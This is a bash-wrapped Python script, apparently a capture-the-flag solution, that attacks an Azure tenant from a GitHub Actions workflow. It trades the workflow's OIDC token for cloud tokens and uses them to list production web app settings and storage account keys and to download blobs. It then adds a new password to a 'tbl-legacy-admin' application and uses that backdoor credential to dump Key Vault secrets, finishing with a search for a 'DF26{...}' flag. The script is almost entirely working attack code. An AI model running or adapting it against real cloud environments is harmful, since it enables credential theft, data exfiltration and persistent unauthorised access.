#!/usr/bin/env bash
set -uo pipefail
python3 - <<'PY'
import os, json, urllib.request, urllib.parse, sys, re

def http(url, data=None, headers=None, method=None):
    h = dict(headers or {})
    body = None
    if isinstance(data, dict):
        body = urllib.parse.urlencode(data).encode()
        h.setdefault("Content-Type", "application/x-www-form-urlencoded")
    elif isinstance(data, (bytes, str)):
        body = data.encode() if isinstance(data, str) else data
    req = urllib.request.Request(url, data=body, headers=h, method=method)
    try:
        with urllib.request.urlopen(req, timeout=30) as r:
            return r.status, r.read()
    except urllib.error.HTTPError as e:
        return e.code, e.read()
    except Exception as e:
        return 0, str(e).encode()

TEN = os.environ["AZURE_TENANT_ID"]
CID = os.environ["AZURE_CLIENT_ID"]
SUB = os.environ["AZURE_SUBSCRIPTION_ID"]
st, b = http(
    os.environ["ACTIONS_ID_TOKEN_REQUEST_URL"] + "&audience=api://AzureADTokenExchange",
    headers={"Authorization": "bearer " + os.environ["ACTIONS_ID_TOKEN_REQUEST_TOKEN"]}
)
IDT = json.loads(b)["value"]

def oidc_token(scope):
    st, b = http(
        f"https://login.microsoftonline.com/{TEN}/oauth2/v2.0/token",
        {"client_id": CID, "scope": scope,
         "grant_type": "client_credentials",
         "client_assertion_type": "urn:ietf:params:oauth:client-assertion-type:jwt-bearer",
         "client_assertion": IDT}
    )
    d = json.loads(b)
    return d.get("access_token", ""), d.get("error_description", "")

ARM, _ = oidc_token("https://management.azure.com/.default")
KVT, _ = oidc_token("https://vault.azure.net/.default")
STT, _ = oidc_token("https://storage.azure.com/.default")
GRP, gr_err = oidc_token("https://graph.microsoft.com/.default")
print(f"ARM:{len(ARM)} KV:{len(KVT)} ST:{len(STT)} Graph:{len(GRP)} err:{gr_err[:80]}")

OUT = {}
RG = "rg-tbl-platform-prod-sea"

print("=== Web App Config ===")
st, b = http(
    f"https://management.azure.com/subscriptions/{SUB}/resourceGroups/{RG}/providers/Microsoft.Web/sites/app-tbl-storefront-prod/config/appsettings/list?api-version=2023-01-01",
    headers={"Authorization": "Bearer " + ARM, "Content-Type": "application/json"},
    method="POST"
)
OUT["webapp_config"] = json.loads(b)
print(json.dumps(OUT["webapp_config"], indent=2)[:3000])

for sa in ("sttblappcfgprodx3euoz", "sttblarchiveprodx3euoz", "sttblbackupprodx3euoz", "sttblcilogsprodx3euoz"):
    print(f"\n=== {sa} keys ===")
    st, b = http(
        f"https://management.azure.com/subscriptions/{SUB}/resourceGroups/{RG}/providers/Microsoft.Storage/storageAccounts/{sa}/listKeys?api-version=2023-01-01",
        headers={"Authorization": "Bearer " + ARM, "Content-Type": "application/json"},
        data="{}",
        method="POST"
    )
    OUT[f"{sa}_keys"] = json.loads(b)
    print(json.dumps(OUT[f"{sa}_keys"], indent=2)[:500])

if STT:
    for sa in ("sttblappcfgprodx3euoz", "sttblarchiveprodx3euoz", "sttblbackupprodx3euoz"):
        print(f"\n=== {sa} containers ===")
        st2, b2 = http(f"https://{sa}.blob.core.windows.net/?comp=list",
            headers={"Authorization": "Bearer " + STT, "x-ms-version": "2021-08-06"})
        cxml = b2.decode(errors='replace')
        print(cxml[:500])
        for c in re.findall(r'<Name>([^<]+)</Name>', cxml):
            print(f"\n--- {sa}/{c} blobs ---")
            st3, b3 = http(f"https://{sa}.blob.core.windows.net/{c}?restype=container&comp=list",
                headers={"Authorization": "Bearer " + STT, "x-ms-version": "2021-08-06"})
            bxml = b3.decode(errors='replace')
            print(bxml[:1000])
            for bn in re.findall(r'<Name>([^<]+)</Name>', bxml)[:20]:
                st4, b4 = http(f"https://{sa}.blob.core.windows.net/{c}/{bn}",
                    headers={"Authorization": "Bearer " + STT, "x-ms-version": "2021-08-06"})
                content = b4.decode(errors='replace')[:5000]
                print(f"  {bn}: [{st4}] {content[:500]}")
                OUT[f"{sa}/{c}/{bn}"] = content

if GRP:
    print("\n=== Graph: addPassword tbl-legacy-admin ===")
    st, b = http(
        "https://graph.microsoft.com/v1.0/applications/22a3fb7e-860a-4708-9e50-3d36aa21191c/addPassword",
        data=json.dumps({"passwordCredential":{"displayName":"vuong-oidc"}}).encode(),
        headers={"Authorization": "Bearer " + GRP, "Content-Type": "application/json"},
        method="POST"
    )
    r = json.loads(b)
    print(json.dumps(r, indent=2)[:500])
    OUT["legacy_admin_cred"] = r
    secret = r.get("secretText", "")
    if secret:
        print(f"\nGot legacy-admin secret!")
        for scope_name, scope_url in [("storage", "https://storage.azure.com/.default"),
                                       ("kv", "https://vault.azure.net/.default"),
                                       ("arm", "https://management.azure.com/.default")]:
            st5, b5 = http(f"https://login.microsoftonline.com/{TEN}/oauth2/v2.0/token",
                {"client_id": "891fb158-e02c-4428-a885-53b811f369c0",
                 "client_secret": secret, "scope": scope_url,
                 "grant_type": "client_credentials"})
            tok = json.loads(b5).get("access_token", "")
            print(f"legacy-admin {scope_name} token: {len(tok)}")
            if scope_name == "storage" and tok:
                for sa2 in ("sttblappcfgprodx3euoz", "sttblarchiveprodx3euoz", "sttblbackupprodx3euoz"):
                    st6, b6 = http(f"https://{sa2}.blob.core.windows.net/?comp=list",
                        headers={"Authorization": "Bearer " + tok, "x-ms-version": "2021-08-06"})
                    cxml2 = b6.decode(errors='replace')
                    print(f"\nLegacy {sa2}: {cxml2[:500]}")
                    for c2 in re.findall(r'<Name>([^<]+)</Name>', cxml2):
                        st7, b7 = http(f"https://{sa2}.blob.core.windows.net/{c2}?restype=container&comp=list",
                            headers={"Authorization": "Bearer " + tok, "x-ms-version": "2021-08-06"})
                        bxml2 = b7.decode(errors='replace')
                        for bn2 in re.findall(r'<Name>([^<]+)</Name>', bxml2)[:20]:
                            st8, b8 = http(f"https://{sa2}.blob.core.windows.net/{c2}/{bn2}",
                                headers={"Authorization": "Bearer " + tok, "x-ms-version": "2021-08-06"})
                            cnt = b8.decode(errors='replace')[:5000]
                            print(f"    {c2}/{bn2}: {cnt[:300]}")
                            OUT[f"legacy_{sa2}/{c2}/{bn2}"] = cnt
            elif scope_name == "kv" and tok:
                for kv in ("kv-tbl-sec-x3euoz", "kv-tbl-prod-x3euoz"):
                    st9, b9 = http(f"https://{kv}.vault.azure.net/secrets?api-version=7.4",
                        headers={"Authorization": "Bearer " + tok})
                    kv_data = json.loads(b9)
                    print(f"\nLegacy KV {kv}: {json.dumps(kv_data)[:300]}")
                    for s in kv_data.get("value", []):
                        nm = s["id"].rstrip("/").split("/")[-1]
                        st10, b10 = http(f"https://{kv}.vault.azure.net/secrets/{nm}?api-version=7.4",
                            headers={"Authorization": "Bearer " + tok})
                        val = json.loads(b10).get("value", "")
                        print(f"  {kv}/{nm} = {val[:300]}")
                        OUT[f"legacy_{kv}/{nm}"] = val
            elif scope_name == "arm" and tok:
                st11, b11 = http(
                    f"https://management.azure.com/subscriptions/{SUB}/resourceGroups/{RG}/providers/Microsoft.Web/sites/app-tbl-storefront-prod/config/appsettings/list?api-version=2023-01-01",
                    headers={"Authorization": "Bearer " + tok, "Content-Type": "application/json"},
                    method="POST")
                OUT["legacy_webapp_config"] = json.loads(b11)
                print(f"\nLegacy webapp: {json.dumps(OUT['legacy_webapp_config'])[:500]}")

result_json = json.dumps(OUT, indent=2)
flags = re.findall(r'DF26\{[^}]{1,200}\}', result_json)
if flags:
    print("\n=== FLAG FOUND ===")
    for f in flags:
        print(f)
else:
    print("\n=== NO FLAG ===")
    print(f"Output length: {len(result_json)}")
PY
echo "=== done ==="
